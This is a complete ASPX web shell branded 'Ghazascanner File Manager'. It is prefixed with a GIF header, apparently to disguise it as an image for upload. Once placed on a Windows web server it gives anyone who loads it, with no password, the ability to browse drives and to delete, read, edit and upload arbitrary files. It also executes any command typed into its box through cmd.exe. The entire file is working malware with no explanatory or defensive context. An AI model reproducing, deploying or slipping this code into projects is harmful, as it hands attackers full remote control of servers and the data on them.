GIF89a;
<%-- ASPX Shell by LT <bu9p3t@gmail.com> (2007) --%>
<%@ Page Language="C#" EnableViewState="false" ValidateRequest="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%--<%@ Import Namespace="System.DirectoryServices" %>--%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>

<%
	string outstr = "";
	
	// get pwd
	string dir = Page.MapPath(".") + "/";
	if (Request.QueryString["path"] != null)
		dir = Request.QueryString["path"] + "/";
	dir = dir.Replace("\\", "/");
	dir = dir.Replace("//", "/");
	
	// build nav for path literal
	string[] dirparts = dir.Split('/');
	string linkwalk = "";	
	foreach (string curpart in dirparts)
	{
		if (curpart.Length == 0)
			continue;
		linkwalk += curpart + "/";
		outstr += string.Format("<a href='?path={0}'>{1}</a>/",
									HttpUtility.UrlEncode(linkwalk),
									HttpUtility.HtmlEncode(curpart));
	}
	lblPath.Text = outstr;
	
	// create drive list
	outstr = "";
	foreach(DriveInfo curdrive in DriveInfo.GetDrives())
	{
		if (!curdrive.IsReady)
			continue;
		string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
		outstr += string.Format("<a href='?path={0}'>{1}</a>&nbsp;",
									HttpUtility.UrlEncode(driveRoot),
									HttpUtility.HtmlEncode(driveRoot));
	}
	lblDrives.Text = outstr;


	// delete file ?

	if ((Request.QueryString["0"] != null) && (Request.QueryString["0"].Length > 0))
		File.Delete(Request.QueryString["0"]);	

	// edit file ?
    if ((Request.QueryString["1"] != null) && (Request.QueryString["1"].Length > 0))
    {
        btSave.Visible = tbEdit.Visible = true;
        tbEdit.Text = File.ReadAllText(Request.QueryString["1"]);
        lbFilename.Text = Request.QueryString["1"];
    }
        

	// receive files ?
	if(flUp.HasFile)
	{
		string fileName = flUp.FileName;
		int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp.FileName.Substring(splitAt);
		flUp.SaveAs(dir + "/" + fileName);
		
	}


	// enum directory and generate listing in the right pane
	DirectoryInfo di = new DirectoryInfo(dir);
	outstr = "";
	foreach (DirectoryInfo curdir in di.GetDirectories())
	{
		string fstr = string.Format("<a href='?path={0}'>{1}</a>",
									HttpUtility.UrlEncode(dir + "/" + curdir.Name),
									HttpUtility.HtmlEncode(curdir.Name));
		outstr += string.Format("<tr><td>{0}</td><td> -- </td><td></td></tr>", fstr);
	}
	foreach (FileInfo curfile in di.GetFiles())
	{
        string fstr = string.Format("<a href='?path={2}&1={0}'>{1}</a>",
									HttpUtility.UrlEncode(dir + "/" + curfile.Name),
									HttpUtility.HtmlEncode(curfile.Name),
                                    HttpUtility.UrlEncode(dir)
                                    );
		string astr = string.Format("<a href='?path={0}&0={1}'>Del</a>",
									HttpUtility.UrlEncode(dir),
									HttpUtility.UrlEncode(dir + "/" + curfile.Name));
        astr = astr + string.Format("&nbsp;<a href='?path={0}&1={1}'>Edit</a>",
									HttpUtility.UrlEncode(dir),
									HttpUtility.UrlEncode(dir + "/" + curfile.Name));
		outstr += string.Format("<tr><td>{0}</td><td>{1:d} KB</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
	}
	lblDirOut.Text = outstr;

	// exec cmd ?
	if (txtCmdIn.Text.Length > 0)
	{
		Process p = new Process();
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.FileName = "cmd.exe";
		p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.WorkingDirectory = dir;
		p.Start();

		lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
		txtCmdIn.Text = "";
	}	
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
	<title>ASPX Shell</title>
	<h1><font color=red>@Ghazascanner</font>_2019runbot</h1>
    <meta name="robots" content="noindex" />
	<style>
        body{
            font-family: "Racing Sans One", cursive;
            background-color: #e6e6e6;
            text-shadow:0px 0px 1px #757575;
            margin: 0;
        }
        #container{
            width: 700px;
            margin: 20px auto;
            border: 1px solid black;
        }
        #header{
            text-align: center;
            border-bottom: 1px dotted black;
        }
        #header h1{
            margin: 0;
        }
        
        #nav,#menu{
            padding-top: 5px;
            margin-left: 5px;
            padding-bottom: 5px;
            overflow: hidden;
            border-bottom: 1px dotted black;
        }
        #nav{
            margin-bottom: 10px;
        }
        
        #menu{
            text-align: center;
        }
        
        #content{
            margin: 0;
        }
        
        #content table{
            width: 700px;
            margin: 0px;
        }
        #content table .first{
            background-color: silver;
            text-align: center;
        }
        #content table .first:hover{
            background-color: silver;
            text-shadow:0px 0px 1px #757575;
        }
        #content table tr:hover{
            background-color: #636263;
            text-shadow:0px 0px 10px #fff;
        }
        
        #footer{
            margin-top: 10px;
            border-top: 1px dotted black;
        }
        #footer p{
            margin: 5px;
            text-align: center;
        }
        .filename,a{
            color: #000;
            text-decoration: none;
            cursor: pointer;
        }
        .filename:hover,a:hover{
            color: #fff;
            text-shadow:0px 0px 10px #ffffff;
        }
        .center{
            text-align: center;
        }
        input,select,textarea{
            border: 1px #000000 solid;
            -moz-border-radius: 5px;
            -webkit-border-radius:5px;
            border-radius:5px;
        }
		pre { font-family: Courier New; background-color: #CCCCCC; }
    </style>
    <script type="text/javascript">
     function escapeHTMLEncode(str) {
  var div = document.createElement('div');
  var text = document.createTextNode(str);
  div.appendChild(text);
  return div.innerHTML;
 }
    </script>
  
  <script runat="server">    private void SaveClick(object sender, EventArgs e)
                             {
                                 File.WriteAllText(HttpUtility.UrlDecode(Request.Params["edit"]), HttpUtility.HtmlDecode(tbEdit.Text));
                                 
                             }
  </script>

</head>
<body>
	 <div id="container">
        <div id="header"><h1><a href="?">Ghazascanner File Manager</a></h1></div>
		
		
    <form id="form1" runat="server">

<div id="nav">
				<div class="new">
					Drive :            
					<asp:Literal runat="server" ID="lblDrives" />
				</div>
				 <div class="new">
					Current <font color="red">Path : </font>
					<asp:Literal runat="server" ID="lblPath" />

			</div><br/>
<div class="upload">
 Upload File : 
				<asp:FileUpload runat="server" ID="flUp" />

				<asp:Button runat="server" ID="cmdUpload" Text="Upload" />
				</div>
							
				<br /><font color="red">CMD : </font><asp:TextBox runat="server" ID="txtCmdIn" Width="300" />

				<asp:Button runat="server" ID="cmdExec" Text="Execute" />
				<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
                <asp:Label runat="server" ID="lbFilename" />
                <asp:TextBox runat="server" ID="tbEdit" TextMode="MultiLine" Width="98%" Height="500" Visible="false" />
                <asp:Button runat="server" ID="btSave" OnClick="SaveClick" Text="Save" Visible="false"/>
                
			

	

        </div><div id="content">
				<table style="width: 100%">
					<tr class="first">
						<th>Name</th>
						<th>Size</th>
						<th style="width: 50px">Actions</th>
					</tr>

					<asp:Literal runat="server" ID="lblDirOut" />
				</table></div></div><font color=red>@Ghazascanner</font>_2019minishell
				


    </form>

</body>
</html>